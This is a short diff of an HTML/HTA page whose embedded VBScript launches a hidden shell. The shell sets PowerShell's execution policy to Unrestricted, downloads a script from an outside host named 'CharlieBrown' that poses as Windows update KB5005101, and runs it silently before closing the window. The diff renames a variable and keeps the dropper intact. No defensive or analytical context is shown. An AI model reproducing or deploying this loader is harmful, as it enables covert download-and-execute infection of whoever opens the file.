@@ -12,9 +12,11 @@
 </body>
 
 <SCRIPT LANGUAGE="VBScript">
-   set SSLProvider = CreateObject("WScript.Shell")
    visible = false
-   SSLProvider.run("cmd /R echo Y|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser && powershell cd $Env:TMP;iwr -uri 'http://CharlieBrown/Update-KB5005101.ps1' -outfile 'Update-KB5005101.ps1';powershell -W 1 -file 'Update-KB5005101.ps1'"), visible
+   set ObjSSLprovider = CreateObject("WScript.Shell")
+   ObjSSLprovider.run("cmd /R echo Y|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser && powershell cd $Env:TMP;iwr -uri 'http://CharlieBrown/Update-KB5005101.ps1' -outfile 'Update-KB5005101.ps1';powershell -W 1 -file 'Update-KB5005101.ps1'"), visible
    window.close()
 </SCRIPT>
 </html>
+
+
